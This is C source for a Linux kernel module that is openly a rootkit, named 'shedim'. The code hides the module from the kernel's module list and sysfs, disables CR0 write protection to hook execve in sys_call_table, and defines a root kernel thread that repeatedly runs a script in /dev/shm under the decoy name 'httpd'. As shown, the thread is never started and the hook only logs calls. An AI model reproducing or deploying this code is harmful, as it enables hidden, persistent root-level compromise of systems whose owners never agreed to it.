#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>
#include <asm/pgtable.h>

#define RK_NAME "shedim"
#define RK_DECOY_NAME "httpd"
#define DEBUG 1
#define CMD "/dev/shm/rk.sh"

struct task_struct *rk_kthread;
unsigned long *syscall_table = NULL;
pte_t *pte;


asmlinkage int
(*real_execve)(const char *filename, char *const argv[], char *const envp[]);

asmlinkage int new_execve
(const char *filename, char *const argv[], char *const envp[])
{
#ifdef DEBUG
   pr_info("%s: hooked call to execve(%s, ...)\n", RK_NAME, filename);
#endif
   return real_execve(filename, argv, envp);
}

static int
rk_thread(void *data)
{
	do {
#ifdef DEBUG
	pr_info("%s: executing %s\n", RK_NAME, CMD);
#endif
	call_usermodehelper(CMD, NULL, NULL, UMH_NO_WAIT);
	msleep(10000);
	} while(!kthread_should_stop());
#ifdef DEBUG
	pr_info("%s: kernel thread stopping\n", RK_NAME);
#endif
	return 0;
}

void
start_cmd_thread(void)
{
	int cpu = 0;
#ifdef DEBUG
	pr_info("%s: starting kernel thread on cpu %d\n", RK_NAME, cpu);
#endif
#ifdef DEBUG
	rk_kthread = kthread_create(rk_thread, &cpu, RK_NAME);
#else
	rk_kthread = kthread_create(rk_thread, &cpu, RK_DECOY_NAME);
#endif
	kthread_bind(rk_kthread, cpu);
	wake_up_process(rk_kthread);
}

void
rk_hide(void)
{
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
}

void
rk_hijack_execve(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(4,3,0)
	unsigned int level;
	syscall_table = NULL;

	syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
	pte = lookup_address((long unsigned int)syscall_table, &level);

	if (syscall_table != NULL) {
		write_cr0 (read_cr0 () & (~ 0x10000));
		real_execve = (void *)syscall_table[__NR_execve];
		syscall_table[__NR_execve] = &new_execve;
		write_cr0 (read_cr0 () | 0x10000);
	} else {
		// TODO: If not debug what?
#ifdef DEBUG
		printk(KERN_EMERG "%s: sys_call_table is NULL\n", RK_NAME);
#endif
	}
#else
	// TODO: Implement syscall hijack for kern after 5.3 with cr0 write
	// protection.
#endif
}

void
rk_unhijack_execve(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(4,3,0)
	if (syscall_table != NULL) {
		write_cr0 (read_cr0 () & (~ 0x10000));
		syscall_table[__NR_execve] = real_execve;
		write_cr0 (read_cr0 () | 0x10000);
#ifdef DEBUG
		printk(KERN_EMERG "%s: sys_call_table unhooked\n", RK_NAME);
#endif
	} else {
		// TODO: If not debug what?
#ifdef DEBUG
		printk(KERN_EMERG "%s: syscall_table is NULL\n", RK_NAME);
#endif
	}
#else
	// TODO: smae as rk_hijack_execve
#endif
}

static int __init
rk_init(void)
{
#ifdef DEBUG
	pr_info("%s: module loaded at 0x%p\n", RK_NAME, rk_init);
#else
	rk_hide();
#endif
	rk_hijack_execve();
	return 0;
}


static void __exit
rk_exit(void)
{
#ifdef DEBUG
	pr_info("%s: module un-loaded at 0x%p\n", RK_NAME, rk_exit);
#endif
	rk_unhijack_execve();
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_AUTHOR("Tommy Pujol");
MODULE_LICENSE("GPL");
